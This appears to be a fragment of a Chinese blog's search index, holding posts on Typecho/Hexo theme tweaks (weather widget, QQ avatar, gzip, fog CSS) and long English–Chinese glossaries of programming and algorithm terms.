Date();if(T.attachEvent){T.attachEvent(&quot;onload&quot;,g)}else{T.addEventListener(&quot;load&quot;,g,false)}}(window,document,&quot;script&quot;,&quot;tpwidget&quot;,&quot;//widget.seniverse.com/widget/chameleon.js&quot;))&lt;/script&gt;&lt;script&gt;tpwidget(&quot;init&quot;, { &quot;flavor&quot;: &quot;slim&quot;, &quot;location&quot;: &quot;WX4FBXXFKE4F&quot;, &quot;geolocation&quot;: &quot;enabled&quot;, &quot;language&quot;: &quot;auto&quot;, &quot;unit&quot;: &quot;c&quot;, &quot;theme&quot;: &quot;chameleon&quot;, &quot;container&quot;: &quot;tp-weather-widget&quot;, &quot;bubble&quot;: &quot;enabled&quot;, &quot;alarmType&quot;: &quot;badge&quot;, &quot;color&quot;: &quot;#C6C6C6&quot;, &quot;uid&quot;: &quot;填写你的UID&quot;, &quot;hash&quot;: &quot;密钥&quot;});tpwidget(&quot;show&quot;);&lt;/script&gt;&lt;!-- 心知结束--&gt; 然后去知心天气官网www.seniverse.com注册申请API 密钥就可以了 7.将QQ头像设置为左边导航栏图片1https://q1.qlogo.cn/g?b=qq&amp;nk=1378373724&amp;s=640 复制上方地址修改1378373724为自己 QQ - 随后将地址添加到初级设置 - 头像图片地址 即可 8.开启 Typecho 的 gzip 压缩以提升网站速度开启找到你的Typecho的网站根目录中的index.php添加如下代码 12/** 开启gzip压缩, add by yovisun */ob_start('ob_gzhandler'); 此行代码需加在 index.php 中 ** 的下方，但不可放在最下方，否则网站可能无法访问 结果完成后，使用 网页GZIP压缩检测 检查结果： 9,云雾特效先获取两张背景图片 图片1 图片2 然后再复制下面css，添加到自定义css 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394*{margin:0;padding:0;} html { box-sizing: border-box; } *, *:before, *:after { box-sizing: inherit; } figure { margin: 0; } .absolute-bg { position: absolute; top: 0; left: 0; z-index: 0; height: 100%; width: 100%; background-position: 50%; background-repeat: no-repeat; background-size: cover; overflow: hidden; } .fog { position: relative; height: 100vh; width: 100%; position: fixed; top: 0; z-index: -1; } .fog__container { position: absolute; height: 100%; width: 100%; overflow: hidden; } .fog__img { position: absolute; height: 100vh; width: 300vw; } .fog__img--first { background: url(&quot;https://wohenliu.com/tupian/ding/heiyun.png&quot;) repeat-x; background-size: contain; background-position: center; -webkit-animation: marquee 60s linear infinite; animation: marquee 60s linear infinite; } .fog__img--second { background: url(&quot;https://wohenliu.com/tupian/ding/heiyun2.png&quot;) repeat-x; background-size: contain; background-position: center; -webkit-animation: marquee 40s linear infinite; animation: marquee 40s linear infinite; } @media screen and (max-width: 767px){ .fog__img--first{ -webkit-animation: marquee 6s linear infinite; animation: marquee 6s linear infinite; } .fog__img--second{ -webkit-animation: marquee 6s linear infinite; animation: marquee 6s linear infinite; } } @-webkit-keyframes marquee { 0% { -webkit-transform: translate3d(0, 0, 0); transform: translate3d(0, 0, 0); } 100% { -webkit-transform: translate3d(-200vw, 0, 0); transform: translate3d(-200vw, 0, 0); } } @keyframes marquee { 0% { -webkit-transform: translate3d(0, 0, 0); transform: translate3d(0, 0, 0); } 100% { -webkit-transform: translate3d(-200vw, 0, 0); transform: translate3d(-200vw, 0, 0); } } 在component / footer.php中搜索footer(); ?&gt;，在这一行上面添加 123456&lt;section class=&quot;fog&quot;&gt; &lt;div class=&quot;fog__container&quot;&gt; &lt;div class=&quot;fog__img fog__img--first&quot;&gt;&lt;/div&gt; &lt;div class=&quot;fog__img fog__img--second&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/section&gt; 这个时候您的博客应该有云在飘了","link":"/2020/08/05/%E6%AF%94%E8%BE%83%E7%82%AB%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89css/"},{"title":"部署55文档","text":"嗨，请准确无误地输入密码查看哟！ ","link":"/2023/11/01/%E9%83%A8%E7%BD%B255/"},{"title":"计算机常用单词","text":"1.程序员必备的600个英语词汇1, 程序员必备的600个英语词汇A-D 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141application 应用程式 应用，应用程序application framework 应用程式框架，应用框架 应用程序框架architecture 架构，系统架构 体系结构argument 引数(传给函式的值)。参见 parameter 参数，实质参数，实参，自变量array 阵列 数组arrow operator arrow (箭头)运算子 箭头操作符assembly 装配件assembly language 组合语言 汇编语言assert(ion) 断言assign 指派，指定，设值，赋值，加载新的assignment 指派，指定 赋值，分配assignment operator 指派(赋值)运算子 = 赋值操作符associatied 相应的，相关的，关联的，相应的associative container 关联式容器(对应 sequential container) 关联式容器atomic 不可分割的， 原子的attribute 属性 特性audio 音讯 音频A.I. 人工智慧 人工智能background 背景 背景(用于图形着色) 后台(用于行程)backward compatible 回溯相容 向下兼容bankwidth 频宽 带宽base class 基础类别 基类base type 基础型别 (等同于 base class)batch 批次(意思是整批作业)批处理benefit 利益 收益best viable function 最佳可行行函式 binary search 二分搜寻法 二分查找binary tree 二元树 二叉树binary funtion 二元函式 双参函数binary operator 二元运算子 二元操作符binding 系结 绑定bit 位元 位bit field 位元栏 位域bitmap 位元图 位图bitwise 以 bit 为单元逐一bitwaise copy 以bit 为单元进行复制 位拷贝block 区块，区段，块，语句块boolean 布林值(真假值，true 或 false) 布尔值border 边框，框线 brace(curly brace) 大括号 花括号bracket(square brakcet) 中括号 方括号breakpoint 中断点 断点build 建造，构建，build-in 内建 内置bus 汇流排 总线business 商务，业务 buttons 按钮byte 位元组(由 8 bits 组成) 字节cache 快取 高速缓存call 呼叫，叫用， 调用callback 呼叫， 回调call operator call (函式呼叫)运算子调用操作符candidate function 候选函式 候选函数chain 串联 链(防火墙的4表5链)character 字元 字符check box 核取方块 复选框checked exception 可控式异常(java)check button 方钮 复选按钮child class 子类别 子类class 类别 类class body 类别本体 类体class declaration 类别宣告 类别宣告式 类声明class definition 类别定义，类别定义式 类定义class derivation list 类别泛化列 类继承列表class head 类别表头 类头class hierarchy 类别继承体系，类别阶层 class library 类别程式库，类别库，类库class template 类别模板，类别范本， 类模板class template partial specialzations 类别模板偏特化class template specializaions 类别模板特化 cleanup 清理 善后 清除client 客户端 客户client-server 主从架构 客户/服务器clipboard 剪贴薄 剪贴板clone 复制 克隆collection 群集 集合combo box 复合方块，复合框 组合框command line 命令行 命令列communication 通讯 compatible 相容 兼容compile time 编译期 编译时component 组件compostion 复合 合成 组合computer 电脑 计算机 concept 概念concrete 具象的 实在的concurrent 并发 并行configuration 组态 配置connection 连接， 连线constratint 约束(条件)construct 构件container 容器containment 内含 包容context 背景关系 环境，上下脉络 上下文control 控制元件 控件console 主控台 控制台const 常数(constant 的缩写，C++ 关键字)constant 常数(相对于 vaariable) 常量constructor(ctor) 建构式 构造函数copy (v) 复制，拷贝copy (n) 复件，副本cover 涵盖 覆盖create 创建，建立，产生，生成，creation 产生，生成 创建cursor 游标 光标custom 订制，自定 定制data 资料 数据database 资料库 数据库database schema 数据库结构纲目data member 资料成员，成员变数，数据成员，成员变量data structure 资料结构 数据结构datagram 资料元 数据报文dead lock 死结 死锁debug 除错 调试debugger 除错器 调试器declaration 宣告，宣告式 声明deduction 推导 推断default 预设 缺省 默认defer 延迟 预定义definition 定义，定义区，定义式 delegate 委派，委托delegation 委派 委托 委任demarshal 反编列 散集dereference 提领dereference operator dereference(提领)运算子 * 解参考操作符derived class 衍生类别 派生类design by contract 契约式设计design pattern 设计范式 设计样式 设计模式destroy 摧毁 销毁destructor 结构式 析构函数device 装置 设备dialog 对话框，对话盒directive 指令directory 目录disk 碟 盘dispatch 分派distributed computing 分布式计算document 文件 文档dot operator dot(句点)运算子 .(圆)点操作符driver 驱动程序 驱动dynamic binding 动态系结 动态绑定 2, 程序员必备的600个英语词汇E-M123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163efficiency 效率efficient 高效end user 终端用户entity 物体 实体encapsulation 封装 封装enclosing class 外围类别(与巢状类别 nested class 有关)外围类enum (enumeration) 列举(一种 C++ 资料型别) 枚举enumerators 列举元(enemy 型别中的成员) 枚举成员、枚举器equal 相等 相等equality 相等性 相等性equality operator equality(等号)运算子 == 等号操作符equivalence 等价性、等同性、对等性 等价性equivalent 等价、等同、对等 等价escape code 转义码 转义码evaluate 评估、求值、核定 event 事件 event driven 事件驱动的 exception 异常情况 异常exception declaration 异常宣告(ref. C++ Primer 3/e, 11.3)异常声明exception handling 异常处理、异常处理机制 异常处理、异常处理机制exception specification 异常规格(ref. C++ Primer 3/e, 11.4)异常规范exit 退离(指离开函式时的那一个执行点) 退出explicit 明白的、明显的、显式 显式export 汇出 引出、导出expression 运算式、算式 表达式facility 设施、设备 feature 特性field 栏位,资料栏(Java) 字段, 值域(Java)file 档案 文件firmware 韧体 固件flag 旗标 标记flash memory 快闪记忆体 闪存flexibility 弹性 灵活性flush 清理、扫清 刷新font 字型 字体form 表单(programming 用语) 窗体formal parameter 形式叁数 形式叁数forward declaration 前置宣告 前置声明forwarding 转呼叫,转发 转发forwarding function 转呼叫函式,转发函式 转发函数fractal 碎形 分形framework 框架 框架full specialization 全特化(ref. partial specialization)function 函式、函数function call operator 同 call operatorfunction object 函式物件(ref. C++ Primer 3/e, 12.3) 函数对象function overloaded resolution 函式多载决议程序 函数重载解决(方案)functionality 功能、机能 功能function template 函式模板、函式范本 函数模板factor 仿函式 、函子game 游戏generate 生成generic 泛型 一般化的、通用的、泛化generic algorithm 泛型演算法 通用算法getter (相对於 setter) 取值函式global 全域的(对应於 local) 全局的global object 全域物件 全局对象global scope resolution operator 全域生存空间(范围决议)运算子 全局范围解析操作符group 群组group box 群组方块 分组框guard clause 卫述句 (Refactoring, p250) 卫语句GUI 图形介面 图形界面hand shaking 握手协商handle 识别码、识别号、号码牌、权柄 句柄handler 处理常式 处理函数hard-coded 编死的 硬编码的hard-copy 硬拷图 屏幕截图hard disk 硬碟 硬盘hardware 硬体 硬件hash table 杂凑表 哈希表、散列表header file 表头档、标头档 头文件heap 堆积 堆hierarchy 阶层体系 层次结构(体系)hook 挂钩 钩子hyperlink 超链结 超链接icon 图示、图标 图标IDE 整合开发环境 集成开发环境identifier 识别字、识别符号 标识符if and only if 若且唯若 当且仅当Illinois 伊利诺 伊利诺斯image 影像 图象immediate base 直接的(紧临的)上层 base class。 直接上层基类immediate derived 直接的(紧临的)下层 derived class。 直接下层派生类immutability 不变性immutable 不可变(的)implement 实作、实现implementation 实作品、实作体、实作码、实件implicit 隐喻的、暗自的、隐式 隐式import 汇入 导入increment operator 累加运算子 ++ 增加操作符infinite loop 无穷回圈 无限循环infinite recursive 无穷递回 无限递归information 资讯 信息infrastructure 公共基础建设inheritance 继承、继承机制inline 行内 内联inline expansion 行内展开 内联展开initialization 初始化(动作) 初始化initialization list 初值列 初始值列表initialize 初始化 初始化inner class 内隐类别 内嵌类instance 实体 实例(根据某种表述而实际产生的「东西」)instantiated 具现化、实体化(常应用於 template) 实例化instantiation 具现体、具现化实体(常应用於 template) 实例integer (integral) 整数(的) 整型(的)integrate 整合 集成interacts 交谈、互动 交互interface 介面 接口for GUI 介面 界面interpreter 直译器 解释器invariants 恒常性,约束条件 约束条件invoke 唤起 调用iterate 迭代(回圈一个轮回一个轮回地进行) 迭代iterative 反覆的，迭代的iterator 迭代器(一种泛型指标) 迭代器iteration 迭代(回圈每次轮回称为一个 iteration) 迭代item 项目、条款 项、条款、项目laser 雷射 激光level 阶 层 (级) 例 high level 高阶 高层library 程式库、函式库 库、函数库lifetime 生命期、寿命 生命期、寿命link 联结、连结 连接,链接linker 联结器、连结器 连接器literal constant 字面常数(例 3.14 或 &quot;hi&quot; 这等常数值) 字面常数list 串列(linked-list) 列表、表、链表list box 列表方块、列表框 列表框load 载入 装载loader 载入器 装载器、载入器local 区域的(对应於 global) 局部的local object 区域物件 局部对象lock 机锁loop 回圈 循环lvalue 左值 左值macro 巨集 宏magic number 魔术数字 魔法数maintain 维护 维护manipulator 操纵器(iostream 预先定义的一种东西) 操纵器marshal 编列 列集 叁考 demarshalmechanism 机制 member 成员 member access operator 成员取用运算子(有 dot 和 arrow 两种) 成员存取操作符member function 成员函式 成员函数member initialization list 成员初值列 成员初始值列表memberwise 以 member 为单元┅、members 逐一┅ 以成员为单位memberwise copy 以 members 为单元逐一复制memory 记忆体 内存menu 表单、选单 菜单message 讯息 消息message based 以讯息为基础的 基於消息的message loop 讯息回圈 消息环method (java) 方法、行为、函式 方法meta -超- 元- 例 meta-programming 超编程 元编程micro 微 middleware 中介层 中间件modeling 模塑modeling language 塑模语言，建模语言modem 数据机 调制解调器module 模组 模块modifier 饰词 修饰符most derived class 最末层衍生类别 最底层的派生类mouse 滑鼠 鼠标mutable 可变的 可变的multi-tasking 多工 多任务 3, 程序员必备的600个英语词汇N-R123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109namespace 命名空间 名字空间、命名空间native 原生的 本地的、固有的nested class 巢状类别 嵌套类network 网路 网络network card 网路卡 网卡object 物件 对象object based 以物件为基础的 基於对象的object file 目的档 目标文件object model 物件模型 对象模型object oriented 物件导向的 面向对象的online 线上 在线opaque 不透明的operand 运算元 操作数operating system (OS) 作业系统 操作系统operation 操作、操作行为 操作operator 运算子 操作符、运算符option 选项，可选方案 选项ordinary 常规的 常规的overflow 上限溢位(相对於 underflow) 溢出(underflow:下溢)overhead 额外负担、额外开销 额外开销overload 多载化、多载化、重载 重载overloaded function 多载化函式 重载的函数overloaded operator 多载化运算子 被重载的操作符overloaded set 多载集合 重载集合override 改写、覆写 重载、改写、重新定义(在 derived class 中重新定义虚拟函式package 套件 包pair 对组palette 调色盘、组件盘、工具箱pane 窗格 窗格(有时为嵌板之意，例 Java Content Pane)parallel 平行 并行parameter 叁数(函式叁数列上的变数) 叁数、形式叁数、形叁parameter list 叁数列 叁数列表parent class 父类别(或称 base class) 父类parentheses 小括弧、小括号 圆括弧、圆括号parse 解析 解析part 零件 部件partial specialization 偏特化(ref. C++ Primer 3/e, 16.10)局部特化 (ref. full specialization)pass by address 传址(函式引数的传递方式)(非正式用语)传地址pass by reference 传址(函式引数的一种传递方式) 传地址, 按引用传递pass by value 传值(函式引数的一种传递方式) 按值传递pattern 范式、样式 模式performance 效率、性能兼而有之 性能persistence 永续性 持久性pixel 图素、像素 像素placement delete ref. C++ Primer 3/e, 15.8.2placement new ref. C++ Primer 3/e, 15.8.2platform 平台 平台pointer 指标 指针 址位器(和址叁器 reference 形成对映，满好)poll 轮询 轮询polymorphism 多型 多态pop up 冒起式、弹出式 弹出式port 埠 端口postfix 后置式、后序式 后置式precedence 优先序(通常用於运算子的优先执行次序)prefix 前置式、前序式 前置式preprocessor 前处理器 预处理器prime 质数 素数primitive type 基本型别 (不同於 base class,基础类别)print 列印 打印printer 印表机 打印机priority 优先权 (通常用於执行绪获得 CPU 时间的优先次序)procedure 程序 过程procedural 程序性的、程序式的 过程式的、过程化的process 行程 进程profile 评测 评测profiler 效能(效率)评测器 效能(性能)评测器programmer 程式员 程序员programming 编程、程式设计、程式化 编程progress bar 进度指示器 进度指示器project 专案 项目、工程property 属性protocol 协定 协议pseudo code 假码、虚拟码、伪码 伪码qualified 经过资格修饰(例如加上 scope 运算子) 限定qualifier 资格修饰词、饰词 限定修饰词quality 品质 质量queue 伫列 队列radian 径度 弧度radio button 圆钮 单选按钮raise 引发(常用来表示发出一个 exception) 引起、引发random number 随机数、乱数 随机数range 范围、区间(用於 STL 时) 范围、区间rank 等级、分等(ref. C++Primer 3/e 9,15章) 等级raw 生鲜的、未经处理的 未经处理的record 记录 记录recordset 记录集 记录集recursive 递回 递归re-direction 重导向 重定向refactoring 重构、重整 重构refer 取用 叁考refer to 指向、指涉、指代reference (C++ 中类似指标的东西，相当於 &quot;化身&quot;) 引用、叁考址叁器, see pointerregister 暂存器 寄存器reflection 反射 反射、映像relational database 关联式资料库 关系数据库represent 表述，表现 表述，表现resolve 决议(为算式中的符号名称寻找 解析对应之宣告式的过程)resolution 决议程序、决议过程 解析过程resolution 解析度 分辨率restriction 局限return 传回、回返 返回return type 回返型别 返回类型return value 回返值 返回值robust 强固、稳健 健壮robustness 强固性、稳健性 健壮性routine 常式 例程runtime 执行期 运行期、运行时common language runtime (CLR) 译为「通用语言执行层」rvalue 右值 4, 程序员必备的600个英语词汇S-T123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354save 储存 存储schedule 排程 调度scheduler 排程器 调度程序scheme 结构纲目、组织纲目scroll bar 卷轴 滚动条scope 生存空间、生存范围、范畴、作用域 生存空间scope operator 生存空间(范围决议)运算子 ::生存空间操作符scope resolution operator 生存空间决议运算子 生存空间解析操作符(与scope operator同)screen 萤幕 屏幕search 搜寻 查找semantics 语意 语义sequential container 序列式容器 顺序式容器(对应於 associative container)server 伺服器、伺服端 服务器、服务端serial 串行serialization 次第读写,序列化 序列化(serialize)setter (相对於 getter) 设值函式signal 信号signature 标记式、签名式、署名式 签名slider 滚轴 滑块slot 条孔、槽 槽smart pointer 灵巧指标、精灵指标 智能指针snapshot 萤幕快照(图) 屏幕截图specialization 特殊、规范splitter 分裂视窗 切分窗口software 软体 软件solution 解法,解决方案 方案source 原始码 源码、源代码stack 堆叠 栈stack unwinding 堆叠辗转开解(此词用於 exception 主题) 栈辗转开解 *standard library 标准程式库standard template library 标准模板程式库statement 述句 语句、声明status bar 状态列、状态栏 状态条STL 见 standard template librarystream 资料流、串流 流string 字串 字符串subroutinesubscript operator 下标运算子 [ ] 下标操作符subtype 子型别 子类型support 支援 支持suspend 虚悬 挂起symbol 符号 记号syntax 语法 语法tag 标签 标记 索引标签,页签target 标的(例 target pointer：标的指标) 目标task switch 工作切换 任务切换template 模板、范本 模板template argument deduction 模板引数推导 模板叁数推导template explicit specialization 模板显式特化(版本) 模板显式特化template parameter 模板叁数 模板叁数temporary object 暂时物件 临时对象text 文字 文本六百词基本上已经整理完了，希望大家有所进步，有所收获 2，程序员不可不知的英文词汇1, 算法常用术语12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182Data Structures 基本数据结构Dictionaries 字典Priority Queues 堆Graph DataStructures 图Set DataStructures 集合Kd-Trees 线段树Numerical Problems 数值问题Solving LinearEquations 线性方程组BandwidthReduction 带宽压缩MatrixMultiplication 矩阵乘法Determinants andPermanents 行列式Constrained andUnconstrained Optimization 最值问题Linear Programming 线性规划Random NumberGeneration 随机数生成Factoring andPrimality Testing 因子分解/质数判定ArbitraryPrecision Arithmetic 高精度计算Knapsack Problem 背包问题Discrete FourierTransform 离散Fourier 变换CombinatorialProblems 组合问题Sorting 排序Searching 查找Median andSelection 中位数GeneratingPermutations 排列生成Generating Subsets 子集生成GeneratingPartitions 划分生成Generating Graphs 图的生成CalendricalCalculations 日期Job Scheduling 工程安排Satisfiability 可满足性Graph Problems --polynomial 图论-多项式算法ConnectedComponents 连通分支TopologicalSorting 拓扑排序Minimum SpanningTree 最小生成树Shortest Path 最短路径Transitive Closureand Reduction 传递闭包Matching 匹配Eulerian Cycle /Chinese Postman Euler 回路/中国邮路Edge and Vertex Connectivity 割边/割点Network Flow 网络流Drawing GraphsNicely 图的描绘Drawing Trees 树的描绘PlanarityDetection and Embedding 平面性检测和嵌入Graph Problems --hard 图论-NP 问题Clique 最大团Independent Set 独立集Vertex Cover 点覆盖Traveling SalesmanProblem 旅行商问题Hamiltonian CycleHamilton 回路Graph Partition 图的划分Vertex Coloring 点染色Edge Coloring 边染色Graph Isomorphism 同构Steiner TreeSteiner 树FeedbackEdge/Vertex Set 最大无环子图ComputationalGeometry 计算几何Convex Hull 凸包Triangulation 三角剖分Voronoi DiagramsVoronoi 图Nearest NeighborSearch 最近点对查询Range Search 范围查询Point Location 位置查询IntersectionDetection 碰撞测试Bin Packing 装箱问题Medial-AxisTransformation 中轴变换PolygonPartitioning 多边形分割SimplifyingPolygons 多边形化简Shape Similarity 相似多边形Motion Planning 运动规划Maintaining LineArrangements 平面分割Minkowski SumMinkowski 和Set and StringProblems 集合与串的问题Set Cover 集合覆盖Set Packing 集合配置String Matching 模式匹配Approximate StringMatching 模糊匹配Text Compression 压缩Cryptography 密码Finite StateMachine Minimization 有穷自动机简化Longest CommonSubstring 最长公共子串Shortest CommonSuperstring 最短公共父串DP Dynamic Programming 动态规划recursion 递归 2, 编程词汇 1123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192A2A integration A2A 整合abstract 抽象的abstract baseclass (ABC)抽象基类abstract class 抽象类abstraction 抽象、抽象物、抽象性access 存取、访问access level 访问级别access function 访问函数account 账户action 动作activate 激活active 活动的actual parameter 实参adapter 适配器add-in 插件address 地址address space 地址空间address-ofoperator 取地址操作符ADL(argument-dependent lookup)ADO(ActiveX DataObject)ActiveX 数据对象advanced 高级的aggregation 聚合、聚集algorithm 算法alias 别名align 排列、对齐allocate 分配、配置allocator 分配器、配置器angle bracket 尖括号annotation 注解、评注API (ApplicationProgramming Interface)应用(程序)编程接口app domain (application domain)应用域application 应用、应用程序applicationframework 应用程序框架appearance 外观append 附加architecture 架构、体系结构archive file 归档文件、存档文件argument 引数(传给函式的值)。参见parameterarray 数组arrow operator 箭头操作符ASP (Active ServerPage)活动服务器页面ASP.NET workerprocess ASP.NET 工作者进程assembly 装配件、配件assembly language 汇编语言assembly manifest 装配件清单assert(ion) 断言assign 赋值assignment 赋值、分配assignmentoperator 赋值操作符associated 相关的、相关联的associativecontainer 关联式容器(对应sequentialcontainer)asynchronous 异步的atomic 原子的atomic operation 原子操作attribute 特性、属性authenticationservice 验证服务authorization 授权audio 音频A.I. 人工智能B2B integrationB2B 整合、B2B 集成(business-to-businessintegration)background 背景、后台(进程)backwardcompatible 向后兼容、向下兼容backup 备份backup device 备份设备backup file 备份文件bandwidth 带宽base class 基类base type 基类型batch 批处理BCL (base classlibrary)基类库binary 二进制binary search 二分查找binary tree 二叉树binary function 双参函数binary largeobject 二进制大对象binary operator 二元操作符binding 绑定bit 位bitmap 位图bitwise 按位...bitwise copy 为单元进行复制；位元逐一复制,按位拷bitwise operation 按位运算block 块、区块、语句块bookkeeping 簿记boolean 布林值(真假值，true 或false)border 边框bounds checking 边界检查boxing 装箱、装箱转换brace (curlybrace)大括号、花括号bracket (squarebrakcet)中括号、方括号breakpoint 断点browserapplications 浏览器应用(程序)browser-accessibleapplication 可经由浏览器访问的应用程序build 编连(专指编译和连接built-in 内建、内置bus 总线business 业务、商务(看场合)business Logic 业务逻辑business rules 业务规则buttons 按钮bug 臭虫by/through 通过byte 位元组(由8 bits 组成)cache 高速缓存calendar 日历call 调用callback 回调call-levelinterface (CLI)调用级接口(CLI)call operator 调用操作符candidate key 候选键(for database)cascading delete 级联删除(for database)cascading update 级联更新(for database)casting 转型、造型转换catalog 目录chain 链(function calls)character 字符character format 字符格式character set 字符集CHECK constraintsCHECK 约束(for database)checkpoint 检查点(for database)check box 复选框check button 复选按钮child class 子类CIL (commonintermediate language)通用中间语言、通用中介语言class 类class declaration 类声明class definition 类定义class derivationlist 类继承列表class factory 类厂class hierarchy 类层次结构class library 类库class loader 类装载器class template 类模板class templatepartial specializations 类模板部分特化class templatespecializations 类模板特化classification 分类clause 子句client application 客户端应用程序client cursor 客户端游标(for database)code page 代码页cleanup 清理、清除CLI (CommonLanguage Infrastructure) 通用语言基础设施client 客户、客户端client area 客户区client-server 客户机/服务器、客户端/服务器clipboard 剪贴板clone 克隆CLS (commonlanguage specification) 通用语言规范code accesssecurity 代码访问安全COFF (CommonObject File Format) 通用对象文件格式collection 集合COM (ComponentObject Model) 组件对象模型combo box 组合框command line 命令行comment 注释commit 提交(for database)communication 通讯compatible 兼容compile time 编译期、编译时compiler 编译器component 组件composite index 复合索引、组合索引(for database)composite key 复合键、组合键(for database)composition 复合、组合concept 概念concrete 具体的concrete class 具体类concurrency 并发、并发机制constraint 约束(for database)configuration 配置、组态connection 连接(for database)connection pooling 连接池console 控制台constant 常量construct 构件、成分、概念、构造（for language）constructor (ctor)构造函数、构造器container 容器containment 包容context 环境、上下文control 控件cookie 存储用户本地数据信息copy 拷贝CORBA 通用对象请求中介架构(Common Object Request Broker Architecture)cover 覆盖、涵盖create/creation 创建、生成crosstab query 交叉表查询(for database)CRTP (curiouslyrecurring template pattern)CTS (common typesystem) 通用类型系统cube 多维数据集(for database)cursor 光标cursor 游标(for database)custom 定制、自定义 3, 编程词汇 2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133data 数据data connection 数据连接(for database)DefinitionLanguage (DDL)数据定义语言(DDL) (for database)data dictionary 数据字典(for database)data dictionaryview 数据字典视图(for database)data file 数据文件(for database)data integrity 数据完整性(for database)data manipulationlanguage (DML)数据操作语言(DML) (for database)data mart 数据集市(for database)data pump 数据抽取(for database)data scrubbing 数据清理(for database)data source 数据源(for database)Data source name(DSN) 数据源名称(DSN) (for database)data warehouse 数据仓库(for database)dataset 数据集(for database)database 数据库(for database)database catalog 数据库目录(for database)database diagram 数据关系图(for database)database file 数据库文件(for database)database object 数据库对象(for database)database owner 数据库所有者(for database)database project 数据库工程(for database)database role 数据库角色(for database)database schema 数据库模式、数据库架构(for database)database script 数据库脚本(for database)data-bound 数据绑定(for database)data-aware control 数据感知控件(for database)data member 数据成员、成员变量dataset 数据集(for database)data source 数据源(for database)data structure 数据结构data table 数据表(for database)datagram 数据报文DBMS (databasemanagement system) 数据库管理系统(for database)DCOM (distributedCOM) 分布式COMdead lock 死锁(for database)deallocate 归还debug 调试debugger 调试器decay 退化decision support 决策支持declaration 声明declarativereferential integrity (DRI)声明引用完整性(DRI) (for database)deduction 推导DEFAULT constraint 默认约束(for database)default database 默认数据库(for database)default instance 默认实例(for database)default result set 默认结果集(for database)default 缺省、默认值defer 推迟definition 定义delegate 委托delegation 委托dependent name 相关名称deploy 部署dereference 解引用dereferenceoperator (提领)运算子derived class 派生类design by contract 契约式设计design pattern 设计模式destroy 销毁destructor(dtor) 析构函数、析构器device 设备DHTML (dynamicHyperText Markup Language) 动态超文本标记语言dialog 对话框digest 摘要digital 数字的DIME (DirectInternet Message Encapsulation) 直接Internet 消息封装directive (编译)指示符directory 目录dirty pages 脏页(for database)dirty read 脏读(for database)disassembler 反汇编器DISCO (Discoveryof Web Services) Web Services 的查找disk 盘dispatch 调度、分派、派发（我喜欢“调度”）DISPID (DispatchIdentifier) 分派标识符distributedcomputing 分布式计算distributed query 分布式查询(for database)DNA (DistributedinterNet Application) 分布式网间应用程序document 文档DOM (DocumentObject Model) 文档对象模型dot operator (圆)点操作符driver 驱动(程序)DTD (document typedefinition) 文档类型定义double-bytecharacter set (DBCS) 双字节字符集(DBCS)dump 转储dump file 转储文件dynamic cursor 动态游标(for database)dynamic filter 动态筛选(for database)dynamic locking 动态锁定(for database)dynamic recovery 动态恢复(for database)dynamic snapshot 动态快照(for database)dynamic SQLstatements 动态SQL 语句(fordatabase)dynamic assembly 动态装配件、动态配件dynamic binding 动态绑定EAI (enterpriseapplication integration) 企业应用程序集成(整合)EBCO (empty baseclass optimization) 空基类优化（机制）e-business 电子商务EDI (DlectronicData Interchange) 电子数据交换efficiency 效率efficient 高效end-to-endauthentication 端对端身份验证end user 最终用户engine 引擎entity 实体encapsulation 封装enclosing class 外围类别(与巢状类别nested class 有关)enum (enumeration) 枚举enumerators 枚举成员、枚举器equal 相等equality 相等性equality operator 等号操作符error log 错误日志(for database)escape code 转义码escape character 转义符、转义字符exclusive lock 排它锁(for database)explicittransaction 显式事务(for database)evaluate 评估event 事件event driven 事件驱动的event handler 事件处理器evidence 证据exception 异常exceptiondeclaration 异常声明exception handling 异常处理、异常处理机制exception-safe 异常安全的exceptionspecification 异常规范exit 退出explicit 显式explicitspecialization 显式特化export 导出expression 表达式 4, 编程词汇 3123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124facility 设施、设备fat client 胖客户端feature 特性、特征fetch 提取field 字段(java)field 字段(for database)field length 字段长度(for database)file 文件filter 筛选(for database)finalization 终结firewall 防火墙finalizer 终结器firmware 固件flag 标记flash memory 闪存flush 刷新font 字体foreign key (FK) 外键(FK) (for database)form 窗体formal parameter 形参forwarddeclaration 前置声明forward-only 只向前的forward-onlycursor 只向前游标(for database)fragmentation 碎片(for database)framework 框架fullspecialization 完全特化function 函数function calloperator (即operator ())函数调用操作符function object 函数对象functionoverloaded resolution 函数重载决议functionality 功能function template 函数模板functor 仿函数GAC (globalassembly cache)全局装配件缓存、全局配件缓存GC (Garbagecollection) 垃圾回收(机制)、垃圾收集(机制)game 游戏generate 生成generic 泛化的、一般化的、通用的generic algorithm 通用算法genericity 泛型getter (相对于setter)取值函数global 全局的global object 全局对象global scoperesolution operator 全局范围解析操作符grant 授权(for database)granularity 粒度group 组、群group box 分组框GUI 图形界面GUID (GloballyUnique Identifier)全球唯一标识符hand shaking 握手handle 句柄handler 处理器hard-coded 硬编码的hard-copy 截屏图hard disk 硬盘hardware 硬件hash table 